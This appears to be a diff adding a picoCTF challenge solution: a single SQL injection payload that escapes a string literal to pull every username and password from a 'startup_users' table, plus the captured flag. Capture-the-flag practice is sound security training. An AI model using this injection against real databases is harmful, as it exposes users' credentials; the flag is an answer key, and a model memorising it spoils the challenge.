@@ -1,0 +1,3 @@
+x'||(SELECT group_concat(nameuser || ': ' || wordpass) FROM startup_users)||'y
+
+picoCTF{1_c4nn0t_s33_y0u_58183fce}
